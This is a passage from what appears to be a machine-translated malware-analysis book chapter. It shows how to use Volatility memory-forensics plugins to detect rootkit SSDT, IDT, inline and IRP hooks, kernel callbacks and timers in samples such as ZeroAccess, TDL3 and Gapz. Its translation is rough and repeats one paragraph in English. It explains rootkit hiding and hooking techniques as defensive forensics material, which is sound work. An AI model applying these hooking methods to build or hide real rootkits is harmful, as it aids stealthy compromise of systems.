HarddiskVolume1要查看设备树，可以使用GUI工具DeviceTree(我们在前面提到过)。该工具将驱动程序显示在树的外缘，它们的设备缩进了一级。附件中的设备是进一步的打算，如下截图所示。你可以将下面的截图与前面的!devstack的输出进行比较，以了解如何解释这些信息: 理解这种分层的方法是很重要的，因为有时候，一个新手驱动可以插入或附加在目标设备的堆栈下面或上面来接收IRP。使用这种技术，rootkit驱动程序可以在将IRP传递给合法驱动程序之前记录或修改它。例如，键盘记录器可以通过插入位于键盘函数驱动程序之上的恶意驱动程序来记录击键。\n7. 显示设备树 您可以使用volatile中的devicetree插件以与devicetree工具相同的格式显示设备树。以下突出显示的条目显示了与volmgr.sys相关联的HarddiskVolume1的设备堆栈:\n$ python vol.py -f win7_x86.vmem --profile=Win7SP1x86 devicetree DRV 0x05329db8 \\Driver\\WMIxWDM ---| DEV 0x85729a38 WMIAdminDevice FILE_DEVICE_UNKNOWN ---| DEV 0x85729b60 WMIDataDevice FILE_DEVICE_UNKNOWN [REMOVED] DRV 0xbf2e0bd8 \\Driver\\volmgr ---| DEV 0x868e7e20 HarddiskVolume1 FILE_DEVICE_DISK ------| ATT 0x868e7b28 - \\Driver\\fvevol FILE_DEVICE_DISK ---------| ATT 0x868e78c0 - \\Driver\\rdyboost FILE_DEVICE_DISK ------------| ATT 0x85707658 - \\Driver\\volsnap FILE_DEVICE_DISK [REMOVED] 为了帮助您理解devicetree插件在司法调查中的使用，让我们来看看一个恶意软件，它创建自己的设备来存储恶意二进制文件。在下面的ZeroAccess rootkit示例中，我使用了cmdline插件，它显示进程命令行参数。这在确定进程的完整路径时很有用(您也可以使用dlllist插件)。从输出中可以看到最后一个svchost.exe进程在可疑的命名空间中运行:\nsvchost.exe pid: 624 Command line : C:\\Windows\\system32\\svchost.exe -k DcomLaunch svchost.exe pid: 712 Command line : C:\\Windows\\system32\\svchost.exe -k RPCSS svchost.exe pid: 764 Command line : C:\\Windows\\System32\\svchost.exe -k LocalServiceNetworkRestricted svchost.exe pid: 876 Command line : C:\\Windows\\System32\\svchost.exe -k LocalSystemNetworkRestricted [REMOVED] svchost.exe pid: 1096 Command line : \"\\\\.\\globalroot\\Device\\svchost.exe\\svchost.exe\" 在之前的讨论中，如果你还记得，\\.\u003csymbolic link name\u003e是从用户模式访问设备的约定的名称。当一个驱动程序为设备创建一个符号链接时，它会被添加到\\GLOBAL??在对象管理器名称空间中的目录(可以使用WinObj工具查看，正如我们前面讨论的那样)。在本例中，globalroot是符号链接的名称。那么，问题是，什么是\\.\\globalroot?结果是 \\.\\globalroot查询\\global??命名空间。换句话说,\\.\\globalroot\\Device\\svchost.exe\\svchost.exe路径与\\Device\\svchost.exe\\svchost.exe相同。在这个阶段，您知道ZeroAccess rootkit会创建它自己的设备(svchost.exe)来隐藏它的恶意二进制文件svchost.exe。要识别创建该设备的驱动程序，可以使用设备树插件。从下面的输出中，可以看出svchost.exe设备是由00015300创建的。sys司机:\n$ python vol.py -f zaccess1.vmem --profile=Win7SP1x86 devicetree [REMOVED] DRV 0x1fc84478 \\Driver\\00015300 ---| DEV 0x84ffbf08 svchost.exe FILE_DEVICE_DISK在下面的BlackEnergy恶意软件的例子中，它取代了合法的 aliide。使用恶意驱动程序来劫持现有服务(在调查服务一节的第10章，使用内存取证来捕获恶意软件)。当服务启动时，恶意驱动程序创建一个设备来与恶意用户模式组件(DLL注入到合法的svchost.exe进程中)通信。以下设备树输出显示了恶意驱动创建的设备:\n$ python vol.py -f be3_big_restart.vmem --profile=Win7SP1x64 devicetree | grep -i aliide -A1 Volatility Foundation Volatility Framework 2.6 DRV 0x1e45fbe0 \\Driver\\aliide ---| DEV 0xfffffa8008670e40 {C9059FFF-1C49-4445-83E8-4F16387C3800} FILE_DEVICE_UNKNOWN了解恶意驱动程序支持的操作类型。你可以使用挥发的驱动程序插件，因为它显示了与特定驱动程序或所有驱动程序相关的主要IRP函数。从下面的输出中，可以看出恶意aliide驱动程序支持IRP_MJ_CREATE(打开)、IRP_MJ_CLOSE(关闭)和IRP_MJ_DEVICE_CONTROL(DeviceIoControl)操作。驱动程序不支持的操作通常在ntoskrnl.exe中指向IopInvalidDeviceRequest，这就是为什么你在ntoskrnl.exe中看到所有其他不支持的操作指向0xfffff80002a5865c的原因:\n$ python vol.py -f be3_big_restart.vmem --profile=Win7SP1x64 driverirp -r aliide Volatility Foundation Volatility Framework 2.6 -------------------------------------------------- DriverName: aliide DriverStart: 0xfffff88003e1d000 DriverSize: 0x14000 DriverStartIo: 0x0 0 IRP_MJ_CREATE 1 IRP_MJ_CREATE_NAMED_PIPE 2 IRP_MJ_CLOSE 3 IRP_MJ_READ 4 IRP_MJ_WRITE [REMOVED] 12 IRP_MJ_DIRECTORY_CONTROL 13 IRP_MJ_FILE_SYSTEM_CONTROL 14 IRP_MJ_DEVICE_CONTROL 15 IRP_MJ_INTERNAL_DEVICE_CONTROL 0xfffff80002a5865c ntoskrnl.exe [REMOVED] 8. 检测内核空间挂钩 当讨论钩子技术时(在第8章，代码注入和钩子)在钩子技术一节中，我们看到了一些恶意程序如何修改调用表(IAT钩子)和一些修改API函数(内联钩子)来控制程序的执行路径，并将其重新路由到恶意代码。目标是阻止对API的调用，监视传递给API的输入参数，或过滤从API返回的输出参数。在第8章，代码注入和hook，主要关注用户空间中的hook技术。如果攻击者设法安装内核驱动程序，在内核空间中也可能有类似的功能。与在用户空间中挂接相比，在内核空间中挂接是一种更强大的方法，因为内核组件在整个系统的操作中扮演着非常重要的角色。它允许攻击者以较高的权限执行代码，使他们能够隐藏恶意组件的存在、绕过安全软件或拦截执行路径。在本节中，我们将了解内核空间中的不同挂钩技术，以及如何使用内存取证来检测这些技术。\n8.1 检测SSDT挂钩 内核空间中的系统服务描述符表(SSDT)包含内核执行程序(ntoskrnl.exe、ntkrnlpa.exe等)导出的系统服务例程(内核函数)的指针。当应用程序调用WriteFile()、ReadFile()或CreateProcess()等API时，它会调用ntdll.dll中的存根，它会将线程切换到内核模式。在内核模式下运行的线程会查询SSDT以确定要调用的内核函数的地址。下面的截图用一个WriteFile()的例子说明了这个概念(这个概念和其他api类似): 通常，ntoskrnl.exe导出核心内核API函数，例如NtReadFile()， NtWrite()File，等等。在x86平台中，指向这些内核函数的指针直接存储在SSDT中，而在x64平台上，SSDT不包含指针。相反，它存储一个经过编码的整数，该整数被解码以确定内核函数的地址。无论实现是什么，概念都是相同的，并且要咨询SSDT来确定特定内核函数的地址。Windows7 x86平台下的WinDbg命令会显示SSDT的内容。表中的条目包含指向ntoskrnl.exe (nt)实现的函数的指针。条目的顺序和数量因操作系统版本而异:\nkd\u003e dps nt!KiServiceTable 82a8f5fc 82c8f06a nt!NtAcceptConnectPort 82a8f600 82ad2739 nt!NtAccessCheck 82a8f604 82c1e065 nt!NtAccessCheckAndAuditAlarm 82a8f608 82a35a1c nt!NtAccessCheckByType 82a8f60c 82c9093d nt!NtAccessCheckByTypeAndAuditAlarm 82a8f610 82b0f7a4 nt!NtAccessCheckByTypeResultList 82a8f614 82d02611 nt!NtAccessCheckByTypeResultListAndAuditAlarm [REMOVED]还有第二个表，类似于SSDT，称为SSDT影子。该表存储了指向win32k.sys导出的gui相关函数的指针。要显示这两个表的条目，可以使用ssdtVolatility插件，如下所示。SSDT[0]为本机SSDT表，SSDT[1]为SSDT影子:\n$ python vol.py -f win7_x86.vmem --profile=Win7SP1x86 ssdt Volatility Foundation Volatility Framework 2.6 [x86] Gathering all referenced SSDTs from KTHREADs... Finding appropriate address space for tables... SSDT[0] at 82a8f5fc with 401 entries Entry 0x0000: 0x82c8f06a (NtAcceptConnectPort) owned by ntoskrnl.exe Entry 0x0001: 0x82ad2739 (NtAccessCheck) owned by ntoskrnl.exe Entry 0x0002: 0x82c1e065 (NtAccessCheckAndAuditAlarm) owned by ntoskrnl.exe Entry 0x0003: 0x82a35a1c (NtAccessCheckByType) owned by ntoskrnl.exe [REMOVED] SSDT[1] at 96c37000 with 825 entries Entry 0x1000: 0x96bc0e6d (NtGdiAbortDoc) owned by win32k.sys Entry 0x1001: 0x96bd9497 (NtGdiAbortPath) owned by win32k.sys Entry 0x1002: 0x96a272c1 (NtGdiAddFontResourceW) owned by win32k.sys Entry 0x1003: 0x96bcff67 (NtGdiAddRemoteFontToDC) owned by win32k.sys 要检测SSDT挂钩，可以在SSDT表中查找不指向ntoskrnl.exe或win32k.sys中的地址的条目。以下代码是一个示例 Mader rootkit，它钩住各种与注册表相关的函数，并将它们指向恶意驱动程序core.sys。在这个阶段，您可以确定核心的基址。Sys使用模块、modscan或驱动程序，然后使用moddump插件将其转储到磁盘上进行进一步分析:\n$ python vol.py -f mader.vmem --profile=WinXPSP3x86 ssdt | egrep -v \"(ntoskrnl|win32k)\" Volatility Foundation Volatility Framework 2.6 [x86] Gathering all referenced SSDTs from KTHREADs... Finding appropriate address space for tables... SSDT[0] at 80501b8c with 284 entries Entry 0x0019: 0xf66eb74e (NtClose) owned by core.sys Entry 0x0029: 0xf66eb604 (NtCreateKey) owned by core.sys Entry 0x003f: 0xf66eb6a6 (NtDeleteKey) owned by core.sys Entry 0x0041: 0xf66eb6ce (NtDeleteValueKey) owned by core.sys Entry 0x0062: 0xf66eb748 (NtLoadKey) owned by core.sys Entry 0x0077: 0xf66eb4a7 (NtOpenKey) owned by core.sys Entry 0x00c1: 0xf66eb6f8 (NtReplaceKey) owned by core.sys Entry 0x00cc: 0xf66eb720 (NtRestoreKey) owned by core.sys Entry 0x00f7: 0xf66eb654 (NtSetValueKey) owned by core.sys对攻击者使用SSDT挂接的缺点是它很容易被检测到，而且Windows的64位版本由于内核补丁保护(KPP)机制，也被称为PatchGuard (https://en.wikipedia.org/wiki/Kernel_Patch_ Protection)，阻止了SSDT挂接。由于SSDT中的条目在不同版本的Windows中有所不同，并且在较新的版本中可能会发生变化，因此恶意软件作者很难编写可靠的rootkit。\n8.2 检测IDT挂钩 中断描述符表(IDT)存储了ISR(中断服务例程或中断处理程序)函数的地址。这些函数处理中断和处理器异常。与挂接SSDT一样，攻击者也可以挂接IDT中的条目，将控制权重定向到恶意代码。要显示IDT条目，你可以使用IDTVolatility插件。一个与IDT挂钩的恶意软件的例子是Uroburos (Turla) rootkit。这个rootkit钩住了位于0xc3 (INT C3)索引的中断处理程序。在一个干净的系统上，0xC3处的中断处理程序指向ntoskrnl.exe内存中的一个地址。以下输出显示了来自clean系统的条目:\n$ python vol.py -f win7.vmem --profile=Win7SP1x86 idt Volatility Foundation Volatility Framework 2.6 CPU Index Selector Value Module Section ------ ------ ---------- ---------- --------- ------------ 0 0 0 1 0 2 0 3 [REMOVED] 0 C1 0x8 0x8282f3f4 hal.dll _PAGELK 0 C2 0x8 0x8288eea4 ntoskrnl.exe .text 0 C3 0x8 0x8288eeae ntoskrnl.exe .text 下面的输出显示钩住的条目。可以看到IDT中的0xC3条目指向UNKNOWN模块中的一个地址。换句话说，被钩入的条目位于ntoskrnl.exe模块的范围之外:\n$ python vol.py -f turla1.vmem --profile=Win7SP1x86 idt Volatility Foundation Volatility Framework 2.6 CPU Index Selector Value Module Section ------ ------ ---------- ---------- --------- ------------ 0 0 0 1 0 2 0 3 [REMOVED] 0x8 0x82890200 ntoskrnl.exe .text 0x8 0x82890390 ntoskrnl.exe .text 0x58 0x00000000 NOT USED 0x8 0x82890800 ntoskrnl.exe .text 0 C1 0x8 0x8282f3f4 hal.dll _PAGELK 0 C2 0x8 0x8288eea4 ntoskrnl.exe .text 0 C3 0x8 0x85b422b0 UNKNOWN 关于Uroburos rootkit的详细分析，并了解rootkit用于触发挂钩中断处理程序的技术，请参阅以下博客文章:https://www.gdatasoftware.com/blog/2014/06/23953-analysis-of-uroburos-using-windbg。\n8.3 识别内联内核钩子 攻击者可以使用jmp指令修改现有内核驱动程序中的一个或多个内核函数，从而将执行流重定向到恶意代码，而不是替换SSDT中的指针(这使其易于识别)。正如本章前面提到的，你可以使用apihooks插件来检测内核空间中的内联挂接。通过指定-P参数，你可以告诉apihooks插件只扫描内核空间中的钩子。在下面这个TDL3 rootkit的例子中，apihook检测内核函数IofCallDriver和IofCompleteRequest中的钩子。被钩子连接的API函数被重定向到名称未知的恶意模块中的0xb878dfb2和0xb878e6bb地址(可能是因为它通过解除KLDR_DATA_TABLE_ENTRY结构的链接来隐藏): $ python vol.py -f tdl3.vmem --profile=WinXPSP3x86 apihooks -P Volatility Foundation Volatility Framework 2.6 ************************************************************************ Hook mode: Kernelmode Hook type: Inline/Trampoline Victim module: ntoskrnl.exe (0x804d7000 - 0x806cf580) Function: ntoskrnl.exe!IofCallDriver at 0x804ee120 Hook address: 0xb878dfb2 Hooking module: \u003cunknown\u003e Disassembly(0): 0x804ee120 ff2500c25480 JMP DWORD [0x8054c200] 0x804ee126 cc INT 3 0x804ee127 cc INT 3 [REMOVED] ************************************************************************ Hook mode: Kernelmode Hook type: Inline/Trampoline Victim module: ntoskrnl.exe (0x804d7000 - 0x806cf580) Function: ntoskrnl.exe!IofCompleteRequest at 0x804ee1b0 Hook address: 0xb878e6bb Hooking module: \u003cunknown\u003e Disassembly(0): 0x804ee1b0 ff2504c25480 JMP DWORD [0x8054c204] 0x804ee1b6 cc INT 3 0x804ee1b7 cc INT 3 [REMOVED]即使钩子模块的名称未知，仍然有可能检测到恶意的内核模块。在这种情况下，我们知道在恶意模块中API函数被重定向到以0xb87开头的地址，这意味着恶意模块必须位于以0xb87开头的某个地址。运行modules插件不会检测到该地址范围内的任何模块(因为它是隐藏的)，而modscan插件检测到一个名为TDSSserv的内核模块。Sys在基址0xb878c000加载，大小为0x11000。换句话说，内核模块TDSSserv的起始地址。Sys为0xb878c000，结束地址为0xb879d000 (0xb878c000+0x11000)。你可以清楚地看到钩子地址0xb878dfb2和0xb878e6bb在tdssserver.sys的地址范围内。至此，我们已经成功识别了恶意驱动程序。现在你可以将驱动程序转储到磁盘上进行进一步分析:\n$ python vol.py -f tdl3.vmem --profile=WinXPSP3x86 modules | grep -i 0xb878 Volatility Foundation Volatility Framework 2.6 $ python vol.py -f tdl3.vmem --profile=WinXPSP3x86 modscan | grep -i 0xb878 Volatility Foundation Volatility Framework 2.6 0x0000000009773c98 TDSSserv.sys 0xb878c000 0x11000 \\systemroot\\system32\\drivers\\TDSSserv.sys8.4 检测IRP函数钩子 rootkit可以修改主函数表(调度例程数组)中的条目，以指向恶意模块中的例程，而不是与内核API函数挂钩。例如，rootkit可以通过覆盖驱动主函数表中IRP_MJ_WRITE对应的地址来检查写入磁盘或网络的数据缓冲区。下面的图表说明了这个概念: 通常，IRP处理程序在它们自己的模块中运行驱动程序点。例如，与null的IRP_MJ_WRITE相关联的例程。Sys指向一个空地址。然而，有时一个驱动程序会将处理函数转发给另一个驱动程序。下面是磁盘驱动程序转发处理程序函数到CLASSPNP.SYS的示例(存储类设备驱动): $ python vol.py -f win7_clean.vmem --profile=Win7SP1x64 driverirp -r disk Volatility Foundation Volatility Framework 2.6 -------------------------------------------------- DriverName: Disk DriverStart: 0xfffff88001962000 DriverSize: 0x16000 DriverStartIo: 0x0 0 IRP_MJ_CREATE 1 IRP_MJ_CREATE_NAMED_PIPE 2 IRP_MJ_CLOSE 3 IRP_MJ_READ 4 IRP_MJ_WRITE 5 IRP_MJ_QUERY_INFORMATION [REMOVED] 0xfffff88001979700 CLASSPNP.SYS 0xfffff8000286d65c ntoskrnl.exe 0xfffff88001979700 CLASSPNP.SYS 0xfffff88001979700 CLASSPNP.SYS 0xfffff88001979700 CLASSPNP.SYS 0xfffff8000286d65c ntoskrnl.exe要检测IRP钩子，您可以关注指向另一个驱动程序的IRP处理程序函数，由于该驱动程序可以将IRP处理程序转发给另一个驱动程序，您需要进一步研究它以确认钩子。如果您正在实验室设置中分析rootkit，那么您可以从一个干净的内存映像中列出所有驱动程序的IRP函数，并将它们与受感染的内存映像中的IRP函数进行比较，以便进行任何修改。在下面的例子中，ZeroAccess rootkit钩子磁盘驱动的IRP函数，并将它们重定向到地址未知的恶意模块中的函数(因为模块是隐藏的):\nDriverName: Disk DriverStart: 0xba8f8000 DriverSize: 0x8e00 DriverStartIo: 0x0 0 IRP_MJ_CREATE 1 IRP_MJ_CREATE_NAMED_PIPE 2 IRP_MJ_CLOSE 3 IRP_MJ_READ 4 IRP_MJ_WRITE 5 IRP_MJ_QUERY_INFORMATION [REMOVED] 0xbabe2bde Unknown 0xbabe2bde Unknown 0xbabe2bde Unknown 0xbabe2bde Unknown 0xbabe2bde Unknown 0xbabe2bde Unknown modscan的以下输出显示了与ZeroAccess相关的恶意驱动程序(具有一个可疑的名称)和它在内存中加载的base地址(可以用来将驱动程序转储到磁盘):\n$ python vol.py -f zaccess_maxplus.vmem --profile=WinXPSP3x86 modscan | grep -i 0xbabe Volatility Foundation Volatility Framework 2.6 0x0000000009aabf18 * 0xbabe0000 0x8000 \\*一些rootkit使用间接的IRP挂钩来避免怀疑。在下面的例子中， Gapz Bootkit钩子null.sys的IRP_MJ_DEVICE_CONTROL。乍一看，似乎一切正常，因为IRP_MJ_DEVICE_CONTROL对应的IRP处理程序地址指向null.sys内。仔细一看，你会发现不符之处;在一个干净的系统上，IRP_MJ_DEVICE_CONTROL指向ntoskrnl.exe (nt!IopInvalidDeviceRequest)中的地址。在这里，它是指向到null.sys中的0x880ee040。在拆卸地址0x880ee040(使用volshell插件)，你可以看到跳转到0x8518cad9的地址，这是在null.sys范围之外:\n$ python vol.py -f gapz.vmem --profile=Win7SP1x86 driverirp -r null Volatility Foundation Volatility Framework 2.6 -------------------------------------------------- DriverName: Null DriverStart: 0x880eb000 DriverSize: 0x7000 DriverStartIo: 0x0 0 IRP_MJ_CREATE 1 IRP_MJ_CREATE_NAMED_PIPE 2 IRP_MJ_CLOSE 3 IRP_MJ_READ 4 IRP_MJ_WRITE 5 IRP_MJ_QUERY_INFORMATION [REMOVED] 13 IRP_MJ_FILE_SYSTEM_CONTROL 14 IRP_MJ_DEVICE_CONTROL 15 IRP_MJ_INTERNAL_DEVICE_CONTROL 0x828ee437 ntoskrnl.exe $ python vol.py -f gapz.vmem --profile=Win7SP1x86 volshell [REMOVED] \u003e\u003e\u003e dis(0x880ee040) 0x880ee040 8bff MOV EDI, EDI 0x880ee042 e992ea09fd JMP 0x8518cad9 0x880ee047 6818e10e88 PUSH DWORD 0x880ee118 As discussed so far, detecting standard hooking techniques is fairly straightforward. For instance, you can look for signs such as SSDT entries not pointing to ntoskrnl.exe/win32k.sys or IRP functions pointing to somewhere else, or jump instructions at the start of the function. To avoid such detections, an attacker can implement hooks while keeping call table entries within the range, or place the jump instructions deep inside the code. To do this, they need to rely on patching the system modules or third-party drivers. The problem with patching system modules is that Windows Kernel Patch Protection (PatchGuard) prevents patching call tables (such as SSDT or IDT) and the core system modules on 64-bit systems. For these reasons, attackers either use techniques that rely on bypassing these protection mechanisms (such as installing a Bootkit/exploiting kernel-mode vulnerabilities) or they use supported ways (which also work on 64-bit systems) to execute their malicious code to blend in with other legitimate drivers and reduce the risk of detection. In the next section, we will look at some of the supported techniques used by the rootkits. [ 465 ] 0x880ee07c Null.SYS 0x828ee437 ntoskrnl.exe 0x880ee07c Null.SYS 0x880ee07c Null.SYS 0x880ee07c Null.SYS 0x880ee07c Null.SYS 0x828ee437 ntoskrnl.exe 0x880ee040 Null.SYS 关于Gapz Bootkit所使用的隐形技术的详细信息，请阅读白皮书(https://www.welivesecurity.com/wp-content/uploads/2013/04/Gapz-Bootkit-whitepaper.pdf)题为“注意Gapz:有史以来分析过的最复杂的Bootkit”，由Eugene Rodionov和Aleksandr Matrosov撰写。\n如上所述，检测标准挂钩技术相当简单。例如，您可以查找诸如SSDT条目没有指向ntoskrnl.exe/win32k.sys这样的迹象或IRP函数指向其他地方，或在函数开始处跳转指令。为了避免这种检测，攻击者可以实现钩子，同时将调用表条目保持在范围内，或者将跳转指令放置在代码深处。要做到这一点，他们需要依赖于给系统模块或第三方驱动程序打补丁。打补丁系统模块的问题是，Windows内核补丁保护(PatchGuard)阻止对64位系统上的调用表(如SSDT或IDT)和核心系统模块打补丁。由于这些原因,攻击者使用技术,依靠绕过这些保护机制(如安装Bootkit/利用内核漏洞)或者他们支持的方式(也在64位系统上工作)来执行他们的恶意代码融入其他合法司机和降低检测的风险。在下一节中，我们将研究rootkit所使用的一些受支持的技术。\n9. 内核回调函数和计时器 Windows操作系统允许一个驱动程序注册一个回调例程，当一个特定的事件发生时，这个回调例程将被调用。例如,如果一个rootkit驱动希望监控的执行和终止所有进程上运行系统,它可以注册回调例程的过程事件通过调用内核函数PsSetCreateProcessNotifyRoutine PsSetCreateProcessNotifyRoutineEx或PsSetCreateProcessNotifyRoutineEx2。当进程事件发生(启动或退出)时，rootkit的回调例程将被调用，然后可以采取必要的操作，例如阻止进程启动。以同样的方式，rootkit驱动程序可以注册一个回调例程来接收通知，当映像(EXE或DLL)加载到内存时，当文件和注册表操作执行时，或当系统即将关闭时。换句话说，回调功能使rootkit驱动程序能够监视系统活动，并根据活动采取必要的操作。在以下链接中，您可以获得一些文档化和无文档化的内核函数列表，rootkit可能会使用这些函数来注册回调例程:https://www.codemachine.com/article_kernel_callback_functions.html。内核函数在Windows驱动程序工具包(WDK)中的不同头文件(ntddk.h、Wdm.h等)中定义。获取文档中内核函数的详细信息的最快方法是进行快速谷歌搜索，这应该会将您带到WDK在线文档中的适当链接。\n回调的工作方式是一个特定的驱动程序创建一个回调对象，该对象是一个包含函数指针列表的结构。创建的回调对象会被通告，以便其他驱动程序使用它。然后，其他驱动程序可以向创建回调对象的驱动程序注册它们的回调例程(https://docs.microsoft.com/en-us/windows-hardware/drivers/kernel/callback-objects)。创建回调的驱动程序可以与注册回调的内核驱动程序相同，也可以不同。要查看系统范围内的回调例程，你可以使用回调volatile插件。在一个干净的Windows系统上，你通常会看到各种驱动程序安装了许多回调，这意味着回调输出中的所有条目不是恶意的;需要进一步分析才能从可疑内存映像中识别恶意驱动程序。\n在下面的例子中，Mader rootkit执行了SSDT挂钩(在本章检测SSDT挂钩一节中讨论)，还安装了一个进程创建回调例程来监视系统上运行的所有进程的执行或终止。特别是，当进程事件发生时，恶意模块核心内地址为0xf66eb050的回调例程。系统调用。Module列指定了回调函数在其中实现的内核模块的名称。Details列给出安装回调的内核对象的名称或描述。识别出恶意驱动程序后，可以进一步调查它，或者将其转储到磁盘进行进一步分析(反汇编、反病毒扫描、字符串提取，等等)，如这里的moddump命令所示:\n$ python vol.py -f mader.vmem --profile=WinXPSP3x86 callbacks Volatility Foundation Volatility Framework 2.6 Type Callback Module Details --------------------------- ---------- ---------- ------- IoRegisterShutdownNotification 0xf9630c6a VIDEOPRT.SYS \\Driver\\VgaSave IoRegisterShutdownNotification 0xf9630c6a VIDEOPRT.SYS \\Driver\\vmx_svga IoRegisterShutdownNotification 0xf9630c6a VIDEOPRT.SYS \\Driver\\mnmdd IoRegisterShutdownNotification 0x805f5d66 ntoskrnl.exe \\Driver\\WMIxWDM IoRegisterFsRegistrationChange 0xf97c0876 sr.sys GenericKernelCallback 0xf66eb050 core.sys PsSetCreateProcessNotifyRoutine 0xf66eb050 core.sys KeBugCheckCallbackListHead 0xf96e85ef NDIS.sys [REMOVED] - - - Ndis miniport $ python vol.py -f mader.vmem --profile=WinXPSP3x86 modules | grep -i core Volatility Foundation Volatility Framework 2.6 0x81772bf8 core.sys 0xf66e9000 0x12000 \\system32\\drivers\\core.sys $ python vol.py -f mader.vmem --profile=WinXPSP3x86 moddump -b 0xf66e9000 - D dump/ Volatility Foundation Volatility Framework 2.6 Module Base ----------- 0x0f66e9000 Module Name Result ----------------- ------ core.sys OK: driver.f66e9000.sys 在下面的例子中，TDL3 rootkit安装进程回调和镜像加载回调通知。这允许rootkit监控进程事件，并在可执行映像(EXE、DLL或内核模块)映射到内存时获得通知。条目中的模块名称设置为UNKNOWN;这告诉你，回调例程存在于一个未知模块中，如果rootkit驱动程序试图通过解除KLDR_DATA_TABLE_ENTRY结构的链接来隐藏，或者如果一个rootkit正在运行一个孤儿线程(一个隐藏或从内核模块分离的线程)，就会发生这种情况。在这种情况下，UNKNOWN条目让你很容易发现可疑条目:\n$ python vol.py -f tdl3.vmem --profile=WinXPSP3x86 callbacks Volatility Foundation Volatility Framework 2.6 Type Callback Module Details ------------------------ ---------- -------- ------- [REMOVED] IoRegisterShutdownNotification 0x805cdef4 ntoskrnl.exe \\FileSystem\\RAW IoRegisterShutdownNotification 0xba8b873a MountMgr.sys \\Driver\\MountMgr GenericKernelCallback 0xb878f108 UNKNOWN IoRegisterFsRegistrationChange 0xba6e34b8 fltMgr.sys GenericKernelCallback 0xb878e8e9 UNKNOWN PsSetLoadImageNotifyRoutine 0xb878f108 UNKNOWN PsSetCreateProcessNotifyRoutine 0xb878e8e9 UNKNOWN KeBugCheckCallbackListHead 0xba5f45ef NDIS.sys [REMOVED] - - - - - Ndis miniport 即使模块名是UNKNOWN，根据回调例程地址，我们可以推断恶意模块应该位于地址为0xb878的内存区域的某个地方。从模块插件的输出中，您可以看到模块本身已经解除了链接，但是modscan插件能够检测到加载在0xb878c000且大小为0x11000的内核模块。显然，所有回调例程地址都在这个模块的范围内。现在已经知道了内核模块的base地址，你可以使用moddump插件来转储它，以便进一步分析:\n$ python vol.py -f tdl3.vmem --profile=WinXPSP3x86 modules | grep -i 0xb878 Volatility Foundation Volatility Framework 2.6 $ python vol.py -f tdl3.vmem --profile=WinXPSP3x86 modscan | grep -i 0xb878 Volatility Foundation Volatility Framework 2.6 0x9773c98 TDSSserv.sys 0xb878c000 0x11000 \\system32\\drivers\\TDSSserv.sys像回调一样，rootkit驱动程序可以创建一个计时器，并在指定的时间经过时得到通知。rootkit驱动程序可以使用此功能来定期执行操作。它的工作方式是，rootkit创建一个计时器，并提供一个名为DPC(延迟过程调用)的回调例程，它将在计时器过期时被调用。当回调例程被调用时，rootkit可以执行恶意操作。换句话说，计时器是rootkit执行恶意代码的另一种方式。关于内核计时器如何工作的详细信息，请参考以下Microsoft文档:https://docs.microsoft.com/en-us/windows-hardware/drivers/kernel/timer-objects-and-dpcs。\n要列出内核计时器，可以使用timersVolatility插件。需要注意的一点是，计时器本身并不是恶意的;这是Windows的功能，所以在一个干净的系统上，你会看到一些合法的驱动程序安装了计时器。与回调函数一样，可能需要进一步分析来识别恶意模块。由于大多数rootkit试图隐藏它们的驱动程序，因此，会创建明显的工件，可以帮助您快速识别恶意模块。在下面的例子中，ZeroAccess rootkit安装了一个6000毫秒的计时器。当这段时间过去时，将调用UNKNOWN模块中地址0x814f9db0的例程。Module列中的UNKNOWN告诉我们模块可能是隐藏的，但是例程地址指向恶意代码存在的内存范围:\n$ python vol.py -f zaccess1.vmem --profile=WinXPSP3x86 timers除了计时器，ZeroAccess还安装回调来监视注册表操作。同样，回调例程地址指向相同的内存范围(从0x814f开始): $ python vol.py -f zaccess1.vmem --profile=WinXPSP3x86 callbacks尝试使用modules, modscan，和driverscan插件来查找UNKNOWN模块不会返回任何结果:\n$ python vol.py -f zaccess1.vmem --profile=WinXPSP3x86 modules | grep -i 0x814f $ python vol.py -f zaccess1.vmem --profile=WinXPSP3x86 modscan | grep -i 0x814f $ python vol.py -f zaccess1.vmem --profile=WinXPSP3x86 driverscan | grep -i 0x814f检查驱动器列表发现了可疑的条目，其中基址和大小被归零(这是不正常的，可能是一个绕过的伎俩)。将基址归零解释了为什么模块、modscan和驱动程序不返回任何结果。输出还显示恶意驱动程序的名称仅由数字组成，这增加了怀疑:\n$ python vol.py -f zaccess1.vmem --profile=WinXPSP3x86 driverscan 通过清空基地地址，rootkit使得司法分析人员很难确定内核模块的起始地址，这也阻止了我们转储恶意模块。我们仍然知道恶意代码的所在位置(以0x814f开头的地址)。一个引人注目的问题是，我们如何使用这些信息来确定基址?一种方法是取其中一个地址并减去一定数量的字节(反向)，直到找到MZ签名，但这种方法的问题是不容易确定要减去多少字节。最快的方法是使用yarascan插件，这个插件允许你在内存中扫描一个模式(字符串，十六进制字节，或正则表达式)。因为我们试图找到位于内核内存中以地址0x814f开始的模块，所以我们可以使用带有-K的yarascan(它只扫描内核内存)来寻找MZ签名。从输出中，可以看到地址为0x814f1b80的可执行文件。您可以将此指定为使用moddump插件将恶意模块转储到磁盘的基本地址。转储模块的大小大约为53.2 KB，即十六进制的0xd000字节。换句话说，模块从地址0x814f1b80开始，到地址0x814feb80结束。所有回调地址都在这个模块的地址范围内: $ python vol.py -f zaccess1.vmem --profile=WinXPSP3x86 yarascan -K -Y \"MZ\" | grep -i 0x814f Volatility Foundation Volatility Framework 2.6 0x814f1b80 4d 5a 90 00 03 00 00 00 04 00 00 00 ff ff 00 00 MZ.............. 0x814f1b90 b8 00 00 00 00 00 00 00 40 00 00 00 00 00 00 00 ........@....... 0x814f1ba0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 0x814f1bb0 00 00 00 00 00 00 00 00 00 00 00 00 d0 00 00 00 ................ 0x814f1bc0 0e 1f ba 0e 00 b4 09 cd 21 b8 01 4c cd 21 54 68 ........!..L.!Th 0x814f1bd0 69 73 20 70 72 6f 67 72 61 6d 20 63 61 6e 6e 6f is.program.canno 0x814f1be0 74 20 62 65 20 72 75 6e 20 69 6e 20 44 4f 53 20 t.be.run.in.DOS. 0x814f1bf0 6d 6f 64 65 2e 0d 0d 0a 24 00 00 00 00 00 00 00 mode....$....... $ python vol.py -f zaccess1.vmem --profile=WinXPSP3x86 moddump -b 0x814f1b80 -D dump/ Module Base Module Name Result ----------- -------------------- ------ 0x0814f1b80 UNKNOWN OK: driver.814f1b80.sys $ ls -al [REMOVED] -rw-r--r-- 1 ubuntu ubuntu 53248 Jun 9 15:25 